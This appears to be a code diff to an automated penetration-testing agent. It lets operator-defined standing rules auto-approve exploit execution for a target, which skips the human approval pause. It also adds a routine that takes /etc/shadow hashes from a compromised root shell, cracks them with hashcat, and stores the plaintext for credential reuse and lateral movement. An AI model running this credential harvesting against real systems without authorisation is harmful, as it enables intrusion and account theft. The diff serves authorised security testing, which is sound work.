@@ -1502,6 +1502,46 @@ def _pending_exploits_for_session(sid: str):
         return None
 
 
+def _target_rule_preapproval(sid: str):
+    """(rule_name, engagement_id) if a STANDING exploit_approval_rule pre-authorises
+    auto-execution for THIS session's target — the operator's advance
+    authorization, per target, exactly like engagement pre-approval (e.g. an
+    "approve everything for 192.168.1.150" rule). Matches an enabled + approved +
+    auto_execute rule whose target pattern matches the session target and whose
+    engagement is this session's or NULL (any). Uses the SAME matcher as the
+    server-side sweep (etl.approval_match) so the graph and the sweep never
+    disagree. Scope is still enforced at execution."""
+    try:
+        row = get_agent_session(_sid(sid)) or {}
+        cfg = row.get("configuration") or {}
+        target = (row.get("target_description") or cfg.get("target_description") or "").strip()
+        eid = cfg.get("engagement_id")
+        if not target:
+            return None, None
+        try:
+            from etl.approval_match import matches as _rule_matches
+        except Exception:  # noqa: BLE001
+            def _rule_matches(pat, val):
+                return str(pat).strip() == str(val).strip()
+        from db_utils import get_db
+        with get_db() as conn, conn.cursor() as cur:
+            cur.execute(
+                "SELECT name, target, engagement_id::text FROM exploit_approval_rules "
+                "WHERE enabled = true AND approved = true AND auto_execute = true "
+                "  AND (engagement_id IS NULL OR engagement_id = %s::uuid)",
+                (str(eid) if eid else None,))
+            rules = cur.fetchall()
+        for name, rtarget, reng in rules:
+            if rtarget and _rule_matches(rtarget, target):
+                return name, reng
+        return None, None
+    except Exception as e:  # noqa: BLE001
+        # Fail CLOSED: an unreadable rule set is not authorization — park as usual.
+        _log.warning("[%s] standing-rule pre-approval lookup failed (%s) — parking",
+                     sid, e)
+        return None, None
+
+
 def exploit_approval(state: PentestState) -> dict:
     """The human-in-the-loop gate: `interrupt()` parks the graph in Postgres until
     the operator answers via POST /pentest/{id}/approve.
@@ -1546,6 +1586,41 @@ def exploit_approval(state: PentestState) -> dict:
                 "findings": [f"exploit_approval: pre-approved ({who}), "
                              f"{len(pending_ids)} exploit(s)"],
                 "log": [f"exploit_approval: pre-approved ({who}) x{len(pending_ids)}"]}
+
+    # Standing-rule pre-approval: a target-scoped "approve everything for this
+    # IP" rule (exploit_approval_rules) is the operator's advance authorization
+    # too — the same short-circuit as engagement pre-approval, keyed on a matching
+    # standing rule instead of engagement metadata. Without this the graph parked
+    # at awaiting_approval even when such a rule existed.
+    rule_name, rule_eng = _target_rule_preapproval(sid)
+    if rule_name:
+        pending_ids = _pending_exploits_for_session(sid)
+        who = f"approval_rule:{rule_name}"
+        for pid in pending_ids:
+            try:
+                _mark_approved(pid, who, note=f"matched standing rule '{rule_name}'")
+            except Exception as e:  # noqa: BLE001
+                _log.warning("[%s] rule-approval mark failed for %s: %s", sid, pid, e)
+        _msg(sid, "Exploit",
+             f"[auto-approved] A standing approval rule ('{rule_name}') authorises "
+             f"exploit execution for this target, so the run is not pausing for a "
+             f"decision. "
+             + (f"Approving {len(pending_ids)} queued exploit(s). "
+                if pending_ids else "No queued exploit was found to approve. ")
+             + "Scope is still enforced at execution — an out-of-scope target is "
+               "refused regardless of the rule.",
+             role="system")
+        _emit("langgraph_exploit_rule_approved", sid,
+              {"rule": rule_name, "pending_exploit_ids": pending_ids,
+               "approved_by": who})
+        return {"phase": "exploit_exec" if pending_ids else "report",
+                "exploit_decision": {"approved": True,
+                                     "note": f"standing rule ({who})",
+                                     "pending_exploit_ids": pending_ids},
+                "findings": [f"exploit_approval: standing rule '{rule_name}' "
+                             f"({len(pending_ids)} exploit(s))"],
+                "log": [f"exploit_approval: standing rule '{rule_name}' "
+                        f"x{len(pending_ids)}"]}
 
     from langgraph.types import interrupt
     # Every queued candidate is named, not just the one the planner liked most.
@@ -1928,6 +2003,18 @@ def post_enumeration(state: PentestState) -> dict:
             if stp["ok"] and stp["output"].strip():
                 _msg(sid, "PostEnumeration",
                      f"[{stp['title']}] {stp['command']}\n{stp['output'][:900]}")
+        # Turn the dumped /etc/shadow into cracked, reusable passwords — a root
+        # shell that only prints hashes has done half the job.
+        loot = _harvest_shell_loot(sid, target, through.get("steps"))
+        if loot.get("hashes"):
+            findings.append(
+                f"post_enumeration: harvested {loot['hashes']} /etc/shadow hash(es) "
+                f"from the held shell → stored {loot.get('stored', 0)}, cracked "
+                f"{loot.get('cracked', 0)} to plaintext (credential reuse enabled)")
+            _msg(sid, "PostEnumeration",
+                 f"[loot] /etc/shadow: {loot['hashes']} hash(es) harvested, "
+                 f"{loot.get('cracked', 0)} cracked to plaintext via offline hashcat "
+                 f"— stored as credentials for reuse/lateral movement.")
     elif through.get("reason"):
         findings.append(f"post_enumeration: {through['reason']}")
 
@@ -2193,6 +2280,69 @@ _POSTEX_INFO_COMMANDS = [
      "-e password -e passwd -e secret /var/www /etc 2>/dev/null | head -20"),
     ("procs", "Running processes", "ps aux 2>/dev/null || ps -ef 2>/dev/null"),
 ]
+
+
+def _harvest_shell_loot(sid, target: str, steps: list) -> dict:
+    """Turn a held shell's ALREADY-DUMPED /etc/shadow into usable passwords.
+
+    _enumerate_through_best_access dumps /etc/shadow (readable only as root) but
+    only ever posted it as a message — the hashes were never parsed, stored, or
+    cracked, so a ROOT shell produced zero reusable credentials. This closes that
+    loop: parse the shadow hashes we already hold, store them as crackable
+    credential_findings, and fire the offline hashcat crack in the exploit-runner
+    (which then stores the plaintext, feeding the credential-reuse / lateral
+    path). Runs for any held shell, including a pre-existing backdoor that no
+    exploit opened (so /postex/enumerate was never auto-fired for it).
+
+    Best-effort; never raises into the enumeration."""
+    out = {"hashes": 0, "stored": 0, "cracked": 0}
+    try:
+        import re as _re
+        import requests as _rq
+        by_id = {stp.get("step"): (stp.get("output") or "") for stp in (steps or [])}
+        shadow = by_id.get("shadow", "")
+        # user:$id$salt$hash: — crypt hashes only ($1/$5/$6/$2y/$y ...)
+        rows = _re.findall(r"(?im)^([a-z_][a-z0-9_-]*):(\$[0-9a-z]{1,2}\$[^:\s]+):", shadow)
+        if not rows:
+            return out
+        out["hashes"] = len(rows)
+        rag = os.environ.get("RAG_API_URL") or "https://rag-api:8000"
+        er = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")
+        api_key = os.environ.get("API_KEY", "changeme")
+        for user, h in rows:
+            try:
+                r = _rq.post(f"{rag}/credentials",
+                             params={"ip": target, "port": 22, "protocol": "ssh",
+                                     "username": user, "secret_value": h,
+                                     "secret_type": "hash", "status": "unknown",
+                                     "source": "postex:shadow"},
+                             headers={"x-api-key": api_key}, timeout=10, verify=False)
+                if r.status_code < 400:
+                    out["stored"] += 1
+            except Exception:  # noqa: BLE001
+                pass
+        # Offline crack (exploit-runner holds hashcat + the wordlist mount). It
+        # reads the hashes we just stored, cracks, and stores the plaintext.
+        try:
+            r = _rq.post(f"{er}/crack/{target}",
+                         headers={"x-api-key": api_key}, timeout=600, verify=False)
+            d = r.json() if r.status_code < 400 else {}
+            out["cracked"] = d.get("cracked", 0)
+        except Exception as e:  # noqa: BLE001
+            out["crack_error"] = str(e)[:160]
+        # REVALIDATE now: probe the freshly-cracked creds so any that work flip to
+        # valid and their login attempts are recorded immediately (dump -> crack ->
+        # store -> revalidate in one flow), not only on the next access sweep.
+        if out.get("cracked"):
+            try:
+                from etl import access as _ax
+                rv = _ax.refresh(target)
+                out["revalidated_live"] = rv.get("live", 0)
+            except Exception as e:  # noqa: BLE001
+                out["revalidate_error"] = str(e)[:160]
+    except Exception as e:  # noqa: BLE001
+        out["error"] = str(e)[:160]
+    return out
 
 
 def _enumerate_through_best_access(sid, target: str) -> dict:
@@ -4001,6 +4151,24 @@ def _exec_one_impactful(sid, pending_id, test):
             has_shell=bool(success), triggered_by="agent",
             triggered_by_session=sid)
         _update_vector_coverage_from_run(sid, test, success, session_id, out, pending_id, er_id)
+        # A PASSED impactful test PROVED impact (command execution / RCE) against
+        # this service — flag it as a FINDING on the asset even without a
+        # persistent shell, so proven exploitation shows up in the asset's
+        # findings, not only as a security_test pass (java-rmi, proftpd, etc. were
+        # proved but never appeared as findings). Idempotent per (ip, port, label).
+        if rec.get("status") == "pass":
+            try:
+                from etl import access as _ax
+                _ip = (test.get("host") or test.get("ip") or test.get("target") or "")
+                _ax.record_exploit_success_finding(
+                    str(_ip).split("/")[0], test.get("port"),
+                    test.get("service") or test.get("category") or "",
+                    test.get("exploit_ref") or test.get("tool")
+                        or test.get("test_id") or "exploit",
+                    (out or "")[:4000],
+                    session_type if success else "command_exec")
+            except Exception as _fe:  # noqa: BLE001
+                _log.debug("[%s] surface-test finding record failed: %s", sid, _fe)
         if success:
             _postex_enumerate(test.get("host"), session_type, session_id, sid)
         return rec.get("status")
